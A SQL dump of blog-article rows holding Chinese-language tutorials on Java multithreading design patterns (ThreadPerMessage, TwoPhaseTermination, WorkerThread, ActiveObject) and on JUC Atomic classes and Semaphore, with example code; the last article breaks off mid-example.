INSERT INTO `article` VALUES (90, 1, 'ThreadPerMessage-多线程设计模式', '2019/10/1570363846_mmexport1570358843674.jpg', '### 单独消息线程设计模式\n```java\n// 单独消息线程设计模式ThreadPerMessage\n(1) 为每一个消息或每一个请求单独提供一个线程\n(2) 由于当消息或请求达到一定峰值时会造成严重的性能下降,所以ThreadPerMessage设计模式被线程池替代了\n(3) 这是一种非常常见的线程使用设计模式,但目前被线程池所替代\n\n// 单独创建线程的坏处\n(1) 每次new Thread新建对象,性能差\n(2) 线程缺乏统一管理,可能无限制的新建线程,相互竞争,有可能占用过多系统资源导致死机或OOM\n(3) 缺少更多功能,如更多执行,定期执行,线程中断\n(4) 频繁创建多线程,非常占用CPU内存\n\n// 线程池的好处\n(1) 降低资源消耗: 通过重复利用已创建的线程降低创建线程和销毁造成的消耗\n(2) 提高响应速度: 当任务到达时,任务可以不需要等到线程创建就能立即执行\n(3) 提高线程的可管理性。线程是稀缺资源。如果无限制地创建,不仅仅会消耗系统资源,还有降低系统的稳定性,使用线程池可以进行统一分配,调优和监控,但是要做到合理利用\n(4) 可有效控制最大并发线程数,提高系统资源利用率,同时可以避免过多的资源竞争,避免阻塞\n```\n### 代码示例\n#### 单个消息\n```java\npublic class Message {\n\n    private final String value;\n\n    public Message(String value) {\n        this.value = value;\n    }\n\n    public String getValue() {\n        return value;\n    }\n}\n```\n#### ThreadPerMessage设计模式消息处理器\n```java\npublic class MessageHandler {\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public void request(Message message) {\n        new Thread(()->{\n            String value = message.getValue();\n            try {\n                Thread.sleep(random.nextInt(1_000));\n                System.out.println(\"The message will be handle by \" + Thread.currentThread().getName() + \" \" + value);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n}\n```\n#### 测试\n```java\npublic class PerThreadClient {\n    public static void main(String[] args) {\n        final MessageHandler messageHandler = new MessageHandler();\n        IntStream.rangeClosed(0 ,10)\n                .forEach( i -> messageHandler.request(new Message(String.valueOf(i))));\n    }\n} \n```\n#### 线程池方式重写消息处理器\n```java\npublic class MessageHandler {\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    private final static Executor executor = Executors.newFixedThreadPool(5);\n\n    public void request(Message message) {\n        executor.execute(()->{\n            String value = message.getValue();\n            try {\n                Thread.sleep(random.nextInt(1_000));\n                System.out.println(\"The message will be handle by \" + Thread.currentThread().getName() + \" \" + value);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void shutdown() {\n        ((ExecutorService)executor).shutdown();\n    }\n}\n```', 0, 0, 16, 0, 0, '2020-06-24 20:10:52', '2020-06-24 20:10:52', 0, 0);
INSERT INTO `article` VALUES (91, 1, 'TwoPhaseTermination-多线程设计模式', '2019/10/1570364755_mmexport1570359026038.jpg', '### 两阶段终止设计模式\n```java\n// 两阶段终止设计模式TwoPhaseTermination\n(1) 一个线程在while(!isInterrupted()){..}循环中执行。\n(2) 另外一个线程判断某个条件达到后获得全部应该被结束线程的引用,调用interrupt()设置线程的中断状态\n(2) 在网络连接等情况下非常常见的设计模式,当主要接收连接的线程被关闭时,需要关闭所有正在处理连接中的线程\n\n```\n### 如何终止线程\n#### 编写处理器\n```java\npublic class CounterIncrement extends Thread {\n\n    private volatile boolean terminated = false;\n\n    private int counter = 0;\n\n    private Random random = new Random(System.currentTimeMillis());\n\n    @Override\n    public void run() {\n        try {\n            while (!terminated) {\n                System.out.println(Thread.currentThread().getName() + \" \" + counter++);\n                Thread.sleep(random.nextInt(1_000));\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace(); // this.interrupt()被调用后,将会执行此处\n        } finally {\n            this.clean();\n        }\n    }\n\n    private void clean() {\n		// 清理其他相关的资源,比如关闭其他线程\n        System.out.println(\"do some clean work for the second phase. current counter\" + counter);\n    }\n\n    public void close() {\n        this.terminated = true;\n        this.interrupt();\n    }\n}\n```\n#### 测试\n```java\npublic class CounterTest {\n    public static void main(String[] args) throws InterruptedException {\n        CounterIncrement counterIncrement = new CounterIncrement();\n        counterIncrement.start();\n\n        Thread.sleep(10_000);\n        counterIncrement.close();\n    }\n}\n```\n### 实现TwoPhaseTermination\n```java\n当关闭AppServer时,关闭自身,并改变标记\n由于AppServer的关闭,AppServer需要对其连接下的所有ClientHandler也必须执行关闭操作\n对AppServer管理下的所有ClientHandler进行关闭\n```\n#### 接收客户端连接AppService\n```java\npublic class AppServer extends Thread {\n\n    private final int port;\n\n    private static final int DEFAULT_PORT = 12722;\n\n    private volatile boolean start = true;\n\n    private List<ClientHandler> clientHandlers = new ArrayList<>();\n\n    private final ExecutorService executor = Executors.newFixedThreadPool(10);\n\n    private ServerSocket server;\n\n    public AppServer() {\n        this(DEFAULT_PORT);\n    }\n\n    public AppServer(int port) {\n        this.port = port;\n    }\n\n    @Override\n    public void run() {\n        try {\n            this.server = new ServerSocket(port);\n            while (start) {\n                Socket client = server.accept();\n                ClientHandler clientHandler = new ClientHandler(client);\n                executor.submit(clientHandler);\n                this.clientHandlers.add(clientHandler);\n            }\n        } catch (IOException e) {\n            // 多种错误\n            // throw new RuntimeException(e);\n        } finally {\n            this.dispose();\n        }\n    }\n\n    private void dispose() { \n		// 关闭所有已连接状态的客户端处理器\n        this.clientHandlers.stream().forEach(ClientHandler::stop);\n        this.executor.shutdown();\n    }\n\n    public void shutdown() throws IOException {\n        this.start = false;\n        this.interrupt();\n        this.server.close();\n    }\n}\n```\n#### 处理单个客户端业务的处理器ClientHandler\n```java\npublic class ClientHandler implements Runnable {\n    private final Socket socket;\n\n    private volatile boolean running = true;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        try(InputStream inputStream = socket.getInputStream();\n            OutputStream outputStream = socket.getOutputStream();\n            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));\n            PrintWriter printWriter = new PrintWriter(outputStream)) {\n            while (running) {\n                String message = br.readLine();\n                if (null == message) { // 客户端断开\n                    break;\n                }\n                System.out.println(\"Come from client >\" + message);\n                printWriter.write(\"echo\" + message + \" \\n\");\n                printWriter.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            this.running = false;\n        } finally {\n            this.stop();\n        }\n    }\n\n    public void stop() {\n        if (!running) {\n            return;\n        }\n        this.running = false;\n        try {\n            this.socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class AppServerClient {\n    public static void main(String[] args) throws InterruptedException, IOException {\n        AppServer server = new AppServer(13345);\n        server.start();\n\n        Thread.sleep(30_000);\n        server.shutdown(); // 关闭主要接收客户端的AppServer\n    }\n}\n```', 0, 0, 27, 0, 0, '2020-06-27 20:26:06', '2020-06-27 20:26:06', 0, 0);
INSERT INTO `article` VALUES (92, 1, 'WorkerThread-多线程设计模式', '2019/10/1570370468_mmexport1570368296348.jpg', '### 工人线程设计模式\n```java\n// 工人线程设计模式WorkerThread\n(1) 工人线程（worker thread）会一次抓一件工作来处理，当没有工作可做时，工人线程会停下来等待心得工作过来\n(2) 有一个流水线（channel），流水线一端有客户线程client，另一端有工人线程worker。\n客户不断把新的任务（request）放入流水线，工人在另一头获得任务，并执行，客户和工人的数量可多可少\n(3) WorkerThread模式在Request的管理上像是ProducerConsumer模式，在Request的行为上像是Command模式\n(4) WorkerThread同时展现了ProducerConsumer模式与Command模式\n\n```\n#### ProducerConsumer与WorkerThread区别\n![多线程设计模式ProducerConsumer与WorkerThread区别.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626701526_多线程设计模式-ProducerConsumer与WorkerThread区别.png)\n```java\n1. WorkerThread是由Channel所创建的,而不是外部创建,这一点不同于ProducerConsumer模式\n2. Request的方法是由WorkerThread所执行的,这一点不同于ProducerConsumer模式\n3. ProducerConsumer模式专注于Message的生产与消费，至于Message被消费时是作何处理，则不在它的讨论范围之中\n\n```\n### 实现WorkerThread\n#### Request\n```java\npublic class Request {\n\n    private final String name;\n\n    private final int number;\n\n    public Request(final String name,final int number) {\n        this.name = name;\n        this.number = number;\n    }\n\n    public void execute() {\n        System.out.println(Thread.currentThread().getName() + \" executed \" + this);\n    }\n\n    @Override\n    public String toString() {\n        return \"Request{\" +\n                \"name=\'\" + name + \'\\\'\' +\n                \", number=\" + number +\n                \'}\';\n    }\n}\n```\n#### Channel\n```java\npublic class Channel {\n\n    private final static int MAX_REQUEST = 100;\n\n    private final Request[] requestQueue;\n\n    private int head;\n\n    private int tail;\n\n    private int count;\n\n    private final WorkerThread[] workerPool;\n\n    public Channel(int workers) {\n        this.requestQueue = new Request[MAX_REQUEST];\n        this.head = 0;\n        this.tail = 0;\n        this.count = 0;\n        this.workerPool = new WorkerThread[workers];\n        this.init();\n    }\n\n    private void init() {\n        for (int i = 0; i < workerPool.length; i++) {\n            workerPool[i] = new WorkerThread(\"Worker-\" + i, this);\n        }\n    }\n\n    /**\n     * push switch to start all of worker to work.\n     */\n    public void startWorkers() {\n        Arrays.asList(workerPool).forEach(WorkerThread::start);\n    }\n\n    public synchronized void put(Request request) {\n        while (count >= requestQueue.length) {\n            try {\n                // 已满等待\n                this.wait();\n            } catch (Exception e) {\n\n            }\n        }\n        this.requestQueue[tail] = request;\n        this.tail = (tail + 1) % this.requestQueue.length;\n        this.count++;\n        this.notifyAll();\n    }\n\n    public synchronized Request take() {\n        while (count <= 0) {\n            try {\n                // 等待填充\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        Request request = this.requestQueue[head];\n        this.head = (head + 1) % this.requestQueue.length;\n        this.count--;\n        this.notifyAll();\n        return request;\n    }\n}\n```\n#### TransportThread\n```java\npublic class TransportThread extends Thread {\n    private final Channel channel;\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public TransportThread(String name, Channel channel) {\n        super(name);\n        this.channel = channel;\n    }\n\n    @Override\n    public void run() {\n        try {\n            for (int i = 0; true; i++) {\n                Request request = new Request(getName(), i);\n                this.channel.put(request);\n                Thread.sleep(random.nextInt(1_000));\n            }\n        } catch (Exception e) {\n\n        }\n    }\n}\n```\n#### WorkerThread\n```java\npublic class WorkerThread extends Thread {\n\n    private final Channel channel;\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public WorkerThread(String name, Channel channel) {\n        super(name);\n        this.channel = channel;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            channel.take().execute();\n            try {\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class WorkerClient {\n    public static void main(String[] args) {\n		// Channel创建5个WorkerThread\n        final Channel channel = new Channel(5);\n        channel.startWorkers();\n\n        new TransportThread(\"Alex\", channel).start();\n        new TransportThread(\"Jack\", channel).start();\n        new TransportThread(\"William\", channel).start();\n    }\n}\n```', 0, 0, 32, 0, 0, '2020-06-27 22:01:20', '2020-06-27 22:01:20', 0, 0);
INSERT INTO `article` VALUES (93, 1, 'ActiveObject-多线程设计模式', '2019/10/1570372704_mmexport1570358163723.jpg', '### 主动对象设计模式\n```java\n// 主动对象设计模式ActiveObject\n(1) 通过对方法的调用与方法的执行进行解耦来提高并发性\n(2) 通过代理将方法的调用转变为向阻塞队列中添加一个请求，由一个线程取出请求后执行实际的方法，然后将结果设置到Future中\n```\n### 实现ActiveObject\n#### 图示\n![多线程设计模式ActiveObject.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626702386_多线程设计模式-ActiveObject.png)\n```java\n(1) 将ActiveObject的方法解耦为单个Request\n(2) 单个方法Request对象持有ActiveObject的实现类Servant\n(3) ActiveObjectPorxy将执行方法传递到SchedulerThread中\n(4) 由SchedulerThread将方法对象放入ActiveionQueue方法对象队列中\n(5) 由SchedulerThread不停将队列中的单个方法Request取出进行执行\n\n```\n#### 定义Result接口\n```java\npublic interface Result {\n    Object getResultValue();\n}\n```\n#### Result普通实现类RealResult\n```java\npublic class RealResult implements Result {\n\n    private final Object resultValue;\n\n    public RealResult(Object resultValue) {\n        this.resultValue = resultValue;\n    }\n\n    @Override\n    public Object getResultValue() {\n        return this.resultValue;\n    }\n}\n```\n#### Result基于Future模式的实现类FutureResult\n```java\npublic class FutureResult implements Result {\n\n    private Result result;\n\n    private boolean ready = false;\n\n    public synchronized void setResult(Result result) {\n        this.result = result;\n        this.ready = true;\n        this.notifyAll();\n    }\n\n    @Override\n    public synchronized Object getResultValue() {\n        while (!ready) {\n            try {\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        return this.result.getResultValue();\n    }\n}\n```\n#### 定义ActiveObject接口\n```java\n/**\n * 接受异步消息的主动对象\n */\npublic interface ActiveObject {\n\n    Result makeString(int count, char fillChar);\n\n    void displayString(String text);\n}\n```\n#### ActiveObject的实现类Servant\n```java\nclass Servant implements ActiveObject {\n\n    @Override\n    public Result makeString(int count, char fillChar) {\n        char[] buf = new char[count];\n        for (int i = 0; i < count; i++) {\n            buf[i] = fillChar;\n            try {\n                Thread.sleep(10);\n            } catch (Exception e) {\n\n            }\n        }\n        return new RealResult(new String(buf));\n    }\n\n    @Override\n    public void displayString(String text) {\n        try {\n            System.out.println(\"Display:\" + text);\n            Thread.sleep(10);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 用于解耦ActiveObject每个方法的MethodRequest\n```java\npublic abstract class MethodRequest {\n\n    protected final Servant servant;\n\n    protected final FutureResult futureResult;\n\n    public MethodRequest(Servant servant, FutureResult futureResult) {\n        this.servant = servant;\n        this.futureResult = futureResult;\n    }\n\n    public abstract void execute();\n}\n```\n#### MethodRequest的实现类MakeStringRequest,对应ActiveObject的makeString(int count, char fillChar)\n```java\n/**\n * {@link ActiveObject#makeString(int, char)}\n */\npublic class MakeStringRequest extends MethodRequest {\n\n    private final int count;\n    private final char fillChar;\n\n    public MakeStringRequest(Servant servant, FutureResult futureResult,\n                             int count, char fillChar) {\n        super(servant, futureResult);\n        this.count = count;\n        this.fillChar = fillChar;\n    }\n\n    @Override\n    public void execute() {\n        Result result = servant.makeString(count, fillChar);\n        futureResult.setResult(result);\n    }\n}\n```\n\n#### MethodRequest的实现类DisplayStringRequest,对应ActiveObject的displayString(String text)\n```java\n/**\n * {@link ActiveObject#displayString(String)}\n */\npublic class DisplayStringRequest extends MethodRequest{\n\n    private final String text;\n\n    public DisplayStringRequest(Servant servant, final String text) {\n        super(servant, null);\n        this.text = text;\n    }\n\n    @Override\n    public void execute() {\n        this.servant.displayString(this.text);\n    }\n}\n```\n#### 用于存储MethodRequest的队列ActivationQueue\n```java\npublic class ActivationQueue {\n\n    private final static int MAX_METHOD_REQUEST_QUEUE_SIZE = 100;\n\n    private final LinkedList<MethodRequest> methodQueue;\n\n    public ActivationQueue() {\n        methodQueue = new LinkedList<>();\n    }\n\n    public synchronized void put(MethodRequest request) {\n        while (methodQueue.size() >= MAX_METHOD_REQUEST_QUEUE_SIZE) {\n            try {\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        this.methodQueue.addLast(request);\n        this.notifyAll();\n    }\n\n    public synchronized MethodRequest take() {\n        while (methodQueue.isEmpty()) {\n            try {\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        MethodRequest methodRequest = this.methodQueue.removeFirst();\n        this.notifyAll();\n        return methodRequest;\n    }\n}\n```\n#### 用于操纵ActivationQueue队列的并执行方法的SchedulerThread\n```java\npublic class SchedulerThread extends Thread {\n\n    private final ActivationQueue activationQueue;\n\n    public SchedulerThread(ActivationQueue activationQueue) {\n        this.activationQueue = activationQueue;\n    }\n\n    public void invoke(MethodRequest request) {\n        this.activationQueue.put(request);\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            activationQueue.take().execute();\n        }\n    }\n}\n```\n#### 返回给主程序的代理类ActiveObjectProxy\n```java\nclass ActiveObjectProxy implements ActiveObject {\n\n    private final SchedulerThread schedulerThread;\n\n    private final Servant servant;\n\n    public ActiveObjectProxy(SchedulerThread schedulerThread, Servant servant) {\n        this.schedulerThread = schedulerThread;\n        this.servant = servant;\n    }\n\n    @Override\n    public Result makeString(int count, char fillChar) {\n        FutureResult futureResult = new FutureResult();\n        schedulerThread.invoke(new MakeStringRequest(servant, futureResult, count, fillChar));\n        return futureResult;\n    }\n\n    @Override\n    public void displayString(String text) {\n        schedulerThread.invoke(new DisplayStringRequest(servant, text));\n    }\n}\n```\n#### 初始化组件并返回代理类的工厂类ActiveObjectFactory\n```java\npublic final class ActiveObjectFactory {\n\n    private ActiveObjectFactory() {\n\n    }\n\n    public static ActiveObject createActiveObject() {\n        Servant servant = new Servant();\n        ActivationQueue queue = new ActivationQueue();\n        SchedulerThread schedulerThread = new SchedulerThread(queue);\n        ActiveObjectProxy proxy = new ActiveObjectProxy(schedulerThread, servant);\n        schedulerThread.start();\n        return proxy;\n    }\n}\n```\n#### 用于专门添加makeString(int count, char fillChar)的线程MakeClientThread\n```java\npublic class MakeClientThread extends Thread {\n    private final ActiveObject activeObject;\n    private final char fillChar;\n\n    public MakeClientThread(ActiveObject activeObject, String name) {\n        super(name);\n        this.activeObject = activeObject;\n        this.fillChar = name.charAt(0);\n    }\n\n    @Override\n    public void run() {\n        try {\n            for (int i = 0; true; i++) {\n                Result result = activeObject.makeString(i + 1, fillChar);\n                Thread.sleep(20);\n                String resultValue = (String)result.getResultValue();\n                System.out.println(Thread.currentThread().getName()+ \": value=\" + resultValue);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n#### 用于专门添加displayString(String text)的线程DisplayClientThread\n```java\npublic class DisplayClientThread extends Thread {\n    private final ActiveObject activeObject;\n\n    public DisplayClientThread(ActiveObject activeObject, String name) {\n        super(name);\n        this.activeObject = activeObject;\n    }\n\n    @Override\n    public void run() {\n        try {\n            for (int i = 0; true; i++) {\n                String text = Thread.currentThread().getName() + \"=>\" + i;\n                activeObject.displayString(text);\n                Thread.sleep(200);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class ActiveObjectTest {\n    public static void main(String[] args) {\n        ActiveObject activeObject = ActiveObjectFactory.createActiveObject();\n\n        new MakeClientThread(activeObject, \"Alex\").start();\n        new MakeClientThread(activeObject, \"Bobby\").start();\n        new DisplayClientThread(activeObject, \"Chris\").start();\n    }\n}\n```', 0, 0, 40, 0, 0, '2020-06-27 22:38:35', '2020-06-27 22:38:35', 0, 0);
INSERT INTO `article` VALUES (94, 1, 'JUC-Atomic、Semaphore', '2019/10/1571239870_mmexport1570975716238.jpg', '### Atomic\n```java\n// Atomic\n(1) jdk8提供的原子性包,解决线程安全问题\n(2) 采用了unsafe提供的CAS算法,也就是CPU级别的同步指令,汇编指令(cmp),它可以探测到其他线程对共享线程的变化情况\n\n// CAS算法是什么\n(1) 与锁相比,使用比较交换(下文简称CAS),会使得程序看起来更加复杂一些,但由于其非阻塞性,它对死锁问题天生免疫\n(2) 线程间的相互影响也远远比基于锁的方式要小,更为重要的是,使用无锁的方式完全没有锁竞争带来的系统开销,也没有线程间频繁调度带来的开销,因此,它要比基于锁的方式拥有更优越的性能\n\n// CAS算法怎么实现\n(1) CAS就是乐观锁思想的实现,相对于比对版本号,CAS则是比对本地内存的预期值 \n(2) V: 需要更新变量 (主内存),E: 预期值 (本地内存),N: 新值\n(3) 如果V = E(主内存值与本地内存一致),说明没有修改过,将V的值设置为N\n(4) 如果V != E(主内存值与本地内存值不一致),说明已经被修改,重新刷新主内存至本地内存,不断循环进行比较直到V = E,将V设置为N\n(5) 采用unsafe类对应汇编指令如compareAndSwapLong ->cmpchg, compareAndSwapObject ->cmpchgq,putOrderedInt ->xchg1\n```\n#### AtomicInteger\n```java\n/**\n * 并发保证原子性与可序性\n */\npublic class AtomicIntegerTest2 {\n\n    private static Set<Integer> set = Collections.synchronizedSet(new HashSet<Integer>());\n\n    public static void main(String[] args) throws InterruptedException {\n        final AtomicInteger value = new AtomicInteger();\n        Thread t1 = new Thread() {\n            @Override\n            public void run() {\n                int x = 0;\n                while (x < 500) {\n                    int v = value.getAndIncrement();\n                    set.add(v);\n                    System.out.println(Thread.currentThread().getName() + \":\" + v);\n                    x++; }\n            }\n        };\n        Thread t2 = new Thread() {\n            @Override\n            public void run() {\n                int x = 0;\n                while (x < 500) {\n                    int v = value.getAndIncrement();\n                    set.add(v);\n                    System.out.println(Thread.currentThread().getName() + \":\" + v);\n                    x++; }\n            }\n        };\n        Thread t3 = new Thread() {\n            @Override\n            public void run() {\n                int x = 0;\n                while (x < 500) {\n                    int v = value.getAndIncrement();\n                    set.add(v);\n                    System.out.println(Thread.currentThread().getName() + \":\" + v);\n                    x++; }\n            }\n        };\n        t1.start();t2.start();t3.start();\n        t1.join();t2.join();t3.join();\n        System.out.println(set.size());\n    }\n}\n```\n#### Atomic充当同步锁\n```java\n/**\n * 充当同步锁\n */\npublic class CompareAndSetLock {\n\n    private final AtomicInteger value = new AtomicInteger(0);\n\n    private Thread lockThread;\n\n    public void tryLock() throws GetLockException {\n        boolean success = value.compareAndSet(0, 1);\n        if (!success) {\n            throw new GetLockException(\"Get the Lock failed\");\n        } else {\n            lockThread = Thread.currentThread();\n        }\n    }\n\n    public void unlock() {\n        if (0 == value.get()) {\n            return;\n        }\n        if (lockThread == Thread.currentThread()) {\n            value.compareAndSet(1, 0);\n        }\n    }\n} \n```\n#### AtomicBoolean\n```java\n/**\n * 充当标志位\n */\npublic class AtomicBooleanFlag {\n\n    // private static volatile  boolean flag = true;\n    // 替代volatile并保证原子性\n    private final static AtomicBoolean flag = new AtomicBoolean(true);\n\n    public static void main(String[] args) throws InterruptedException {\n        new Thread() {\n            @Override\n            public void run() {\n                while(flag.get()) {\n                    try {\n                        Thread.sleep(1_000);\n                        System.out.println(\"I am working.\");\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n                System.out.println(\"I am finished\");\n            }\n        }.start();\n        Thread.sleep(5_000);\n        flag.set(false);\n    }\n}\n```\n#### AtomicLong\n```java\n// AtomicLong使用方式与AtomicInteger一致\n// 但是AtomicLong出现了下面的代码\nstatic final boolean VM_SUPPORTS_LONG_CAS = VMSupportsCS8();\nprivate static native boolean VMSupportsCS8();\n\n// 它们的作用是查看CPU是否支持无锁机制\n// 因为long 64(high 32+low  32) long类型有高低位,需要两次运算,需要保证原子性\n// VMSupportsCS8 true支持时使用cmp指令操作\n// VMSupportsCS8 false不支持时数据总线加锁\n```\n\n#### AtomicIntegerArray\n```java\n/**\n * AtomicIntegerArray使用方式\n */\npublic class AtomicIntegerArrayTest {\n\n    @Test\n    public void testCreateAtomicIntegerArray() {\n        AtomicIntegerArray array = new AtomicIntegerArray(10);\n        System.out.println(array.length()); // 10\n    }\n\n    @Test\n    public void testGet() {\n        AtomicIntegerArray array = new AtomicIntegerArray(10);\n        System.out.println(array.length()); // 10\n        System.out.println(array.get(5)); // 0\n    }\n\n    @Test\n    public void testSet() {\n        AtomicIntegerArray array = new AtomicIntegerArray(10);\n        array.set(5, 5);\n        System.out.println(array.length()); //10\n        System.out.println(array.get(5));// 5\n    }\n\n    @Test\n    public void testGetAndSet() {\n        int[] originalArray = new int[10];\n        originalArray[5] = 5;\n        AtomicIntegerArray array = new AtomicIntegerArray(originalArray);\n        int v = array.getAndSet(5, 6);\n        System.out.println(v); // 5\n        System.out.println(array.get(5));// 6\n    }\n}\n```\n\n#### AtomicReference\n```java\n/**\n * 使用方式\n */\npublic class AtomicReferenceTest {\n    public static void main(String[] args) {\n        // 基本使用\n        AtomicReference<Simple> atomic = new AtomicReference<>(new Simple(\"Alex\", 123));\n        System.out.println(atomic.get());\n\n        boolean success = atomic.compareAndSet(new Simple(\"sdfs\", 22), new Simple(\"sdf\", 23));\n        System.out.println(success);\n\n        JButton button = new JButton();\n        // default 多线程之外的应用场景 使用在匿名内部类中\n        // Simple s = new Simple(\"t\", 12);\n        final AtomicReference<Simple> s = new AtomicReference(new Simple(\"t\", 12));\n        button.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                // invoke restful service\n                // s = new Simple(\"qwe\", 123);\n                s.set(new Simple(\"qwe\", 123));\n            }\n        });\n    }\n\n    static class Simple {\n        private String name;\n        private int age;\n\n        public Simple(String name, int age) {\n            this.name = name;\n            this.age = age;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public int getAge() {\n            return age;\n        }\n    }\n}\n```\n#### AtomicStampedReference解决ABA问题\n```java\n// CAS缺点,ABA问题\n(1) ABA问题它是指在CAS操作的时候,其他线程将变量的值A改成了B但是又改回了A,本线程使用期望值A与当前变量进行比较的时候,发现A变量没有变,于是CAS就将A值进行交换操作\n(2) 这个时候实际上该值已经被其他线程改变过,这与设计思想是不符合的,因此ABA问题的解决思路,每次变量更新的时候把变量的版本号加一,那么之前那个A改为B改为A变为A1是1版本,B是2版本,A2是3版本,这时,只要变量被线程修改过,该变量对应的版本号就会发生递增变化,从而解决了ABA问题\n(3) Java并发包中提供一个带有标记的原子引用类AtomicStampedReference,它可以通过控制变量值的版本来保证CAS的正确性\n\n```\n#### AtomicStampedReference\n```java\n/**\n * AtomicStampedReference解决ABA问题\n */\npublic class AtomicStampedReferenceTest {\n\n    private static AtomicStampedReference<Integer> atomicStampedReference = new AtomicStampedReference<>(100, 0);\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread t1 = new Thread(()->{\n            try {\n                TimeUnit.SECONDS.sleep(1);\n                boolean success = atomicStampedReference.compareAndSet(100, 101, atomicStampedReference.getStamp(), atomicStampedReference.getStamp()+1);\n                System.out.println(success);\n                success = atomicStampedReference.compareAndSet(101, 100, atomicStampedReference.getStamp(), atomicStampedReference.getStamp()+1);\n                System.out.println(success);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n\n        Thread t2 = new Thread(()->{\n            try {\n                int stamp = atomicStampedReference.getStamp();\n                System.out.println(\"Before sleep: stamp=\" + stamp); // 0\n                TimeUnit.SECONDS.sleep(2);\n                boolean success = atomicStampedReference.compareAndSet(100, 101, stamp, stamp+1);\n                System.out.println(success); // false\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n    }\n}\n```\n#### AtomicXXXFieldUpdater\n```java\n// AtomicXXFieldUpdater使用场景\n(1) 想让类的属性操作具备原子性,volatile,非private,protected(如果当前类也可以是private,protected),类型必须一致\n(2) 不想使用锁(包含显式锁或重量级锁synchronized)\n(3) 大量需要原子类型修饰的对象,相比较耗费内存,而使用FieldUpdater可以节省大量内存\n\npublic class AIFUTest {\n    private volatile int i;\n\n    private AtomicIntegerFieldUpdater<AIFUTest> updater = AtomicIntegerFieldUpdater.<AIFUTest>newUpdater(AIFUTest.class, \"i\");\n\n    public void update(int newValue) {\n        updater.compareAndSet(this, i, newValue);\n    }\n\n    public int get() {\n        return i;\n    }\n\n    public static void main(String[] args) {\n        AIFUTest test = new AIFUTest();\n        test.update(10);\n        System.out.println(test.get());\n    }\n}\n```\n#### AtomicIntegerFieldUpdater\n```java\npublic class AtomicIntegerFieldUpdateTest {\n\n    public static void main(String[] args) {\n        final AtomicIntegerFieldUpdater<TestMe> updater = AtomicIntegerFieldUpdater.newUpdater(TestMe.class, \"i\");\n        final TestMe me = new TestMe();\n        for(int i = 0; i < 2; i++) {\n            new Thread() {\n                @Override\n                public void run() {\n                    final int MAX = 20;\n                    for (int j = 0; j < MAX; j++) {\n                        int v = updater.getAndIncrement(me);\n                        System.out.println(Thread.currentThread().getName() + \"=>\" + v);\n                    }\n                }\n            }.start();\n        }\n    }\n\n    static class TestMe {\n        volatile int i;\n    }\n}\n```\n#### AtomicReferenceFieldUpdater\n```java\n	@Test\n    public void testFieldReference() {\n        AtomicReferenceFieldUpdater<TestMe2, Integer> updater = AtomicReferenceFieldUpdater.newUpdater(TestMe2.class, Integer.class, \"i\");\n        TestMe2 me = new TestMe2();\n        updater.compareAndSet(me, null, 1);\n        System.out.println(me.i);\n    }\n\n    static class TestMe2 {\n        volatile Integer i;\n    }\n```\n### Semaphore\n```java\n// Semaphore\n(1) 信号量可以控制并发访问的线程个数\n(2) 在操作系统里信号量在进程控制方面有重要的应用\n(3) Semaphore可以很容易的控制某个资源可被同时访问的个数\n\n// Semaphore应用场景\n(1) Semaphore控制同时访问的线程数\n(2) 实现同步显式锁\n\n```\n#### 控制同时访问的线程数\n```java\n/**\n * 应用场景\n *  控制同时访问的线程数\n */\npublic class SemaphoreExample2 {\n\n    public static void main(String[] args) throws InterruptedException {\n        // 允许的最大线程数锁 许可证2个\n        final Semaphore semaphore = new Semaphore(2);\n        for (int i = 0; i < 3; i++) {\n            new Thread() {\n                @Override\n                public void run() {\n                    System.out.println(Thread.currentThread().getName() + \"in\");\n                    try {\n                        semaphore.acquire(1);\n                        System.out.println(Thread.currentThread().getName() + \" Get the semaphore\");\n                        TimeUnit.SECONDS.sleep(5);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    } finally {\n                        semaphore.release(1);\n                    }\n                    System.out.println(Thread.currentThread().getName() + \"out\");\n                }\n            }.start();\n        }\n        while (true) {\n            System.out.println(\"AP->\" + semaphore.availablePermits()); // 剩余的permits\n            System.out.println(\"QL->\" + semaphore.getQueueLength()); // 评估值 有几个acquire中的线程\n            System.out.println(\"========\");\n            TimeUnit.SECONDS.sleep(1);\n        }\n    }\n}\n```\n\n#### 实现同步显式锁\n```java\n/**\n * 应用场景\n *  实现同步显式锁\n */\npublic class SemaphoreExample1 {\n    public 